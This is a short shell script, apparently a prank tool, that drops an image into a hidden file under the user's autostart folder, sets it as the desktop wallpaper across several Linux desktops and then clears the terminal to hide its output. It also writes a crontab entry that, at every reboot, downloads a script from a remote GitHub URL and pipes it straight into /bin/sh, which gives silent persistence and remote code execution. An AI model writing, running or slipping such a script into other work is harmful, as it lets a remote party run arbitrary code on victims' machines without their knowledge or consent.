#!/bin/sh

FOLDERPATH="$HOME/.config/autostart"
FILENAME=".tmp"
URL="https://github.com/ps1337/HassleTheHoff/blob/master/res/notHasslehoff.jpg?raw=true"
SCRIPTURL="https://raw.githubusercontent.com/ps1337/HassleTheHoff/master/hasslethehoff.sh"

mkdir -p $FOLDERPATH

# Download stuff
if [ -x "$(command -v wget)" ]; then
    wget $URL -O "$FOLDERPATH/$FILENAME"
    DOWNLOADER="wget -q -O - "

elif [ -x "$(command -v curl)" ]; then
    cd $FOLDERPATH && { curl -O $URL; mv notHasslehoff.jpg $FILENAME; cd -; }
    DOWNLOADER="curl"
else
    echo "Can't download :("
    exit 1
fi

# Set stuff
# Gnome
if [ -x "$(command -v gsettings)" ]; then
    gsettings set org.gnome.desktop.background picture-uri "file://$FOLDERPATH/$FILENAME"
fi

# Old Gnome
if [ -x "$(command -v gconftool-2)" ]; then
    gconftool-2 –type string –set /desktop/gnome/background/picture_filename "file://$FOLDERPATH/$FILENAME"
fi

# KDE Plasma
if [ -x "$(command -v plasmashell)" ]; then
    # Yes, srsly. From: https://www.reddit.com/r/kde/comments/65pmhj/change_wallpaper_from_terminal/
    dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
    var Desktops = desktops();
    for (i=0;i<Desktops.length;i++) {
            d = Desktops[i];
            d.wallpaperPlugin = "org.kde.image";
            d.currentConfigGroup = Array("Wallpaper",
                                        "org.kde.image",
                                        "General");
            d.writeConfig("Image", "file:///$FOLDERPATH/$FILENAME");
    }'
fi

# Misc (i3, ...)
if [ -x "$(command -v feh)" ]; then
    feh --bg-scale "$FOLDERPATH/$FILENAME"
fi

# Add a cronjob
# https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
# Write out current crontab
crontab -l > /tmp/.cronbkp
# Echo new cronjob into cron file
echo "@reboot $DOWNLOADER "$SCRIPTURL" | /bin/sh" >> /tmp/.cronbkp
# Install new cron file
crontab /tmp/.cronbkp
rm /tmp/.cronbkp

clear
clear
clear
